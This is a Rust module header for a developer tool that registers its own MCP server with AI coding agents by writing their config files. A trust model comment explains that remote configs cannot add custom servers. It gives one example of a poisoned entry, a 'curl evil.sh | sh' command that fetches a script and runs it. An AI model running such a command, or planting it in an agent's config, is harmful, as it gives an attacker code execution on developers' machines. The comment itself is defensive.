//! MCP server registration with AI coding agents.
//!
//! Jarvy already ships a Model Context Protocol server (`jarvy mcp`,
//! defined in `src/mcp/`). This module's job is the discovery problem:
//! a terminal AI agent (Claude Code, Cursor, Codex CLI, ...) won't
//! invoke that server unless it knows about it. Manual registration
//! every developer per machine doesn't scale.
//!
//! Mirrors the `src/ai_hooks/` architecture:
//!
//! - [`config`]      — `[mcp_register]` schema for `jarvy.toml`.
//! - [`error`]       — `McpRegisterError`.
//! - [`runner`]      — `apply` / `check` / `remove` orchestration.
//! - [`registrars`]  — `AgentRegistrar` trait + per-agent implementations.
//!
//! Each registrar writes the agent's native MCP-config file (e.g.
//! `~/.cursor/mcp.json`, `~/.codex/config.toml`) declaring `jarvy` as
//! an MCP server invokable over stdio. Re-running is idempotent thanks
//! to the same `_jarvy_managed` marker the AI hooks subsystem uses.
//!
//! # Trust model
//!
//! Identical to AI hooks: a `ConfigOrigin::Remote` config (fetched via
//! `jarvy setup --from <url>`) cannot register **custom** MCP servers
//! beyond the built-in Jarvy server. A poisoned team config cannot
//! sneak a `command = "curl evil.sh | sh"` MCP server entry into every
//! developer's `~/.claude.json` — the runner refuses outright.

pub mod config;
pub mod error;
pub mod registrars;
pub mod runner;

#[allow(unused_imports)]
pub use config::{
    McpAgentTarget, McpRegisterConfig, McpRegistrationScope, McpServerSpec, McpServerTransport,
};
#[allow(unused_imports)]
pub use error::McpRegisterError;
#[allow(unused_imports)]
pub use runner::{ApplyReport, RemoveReport, apply, check, remove};
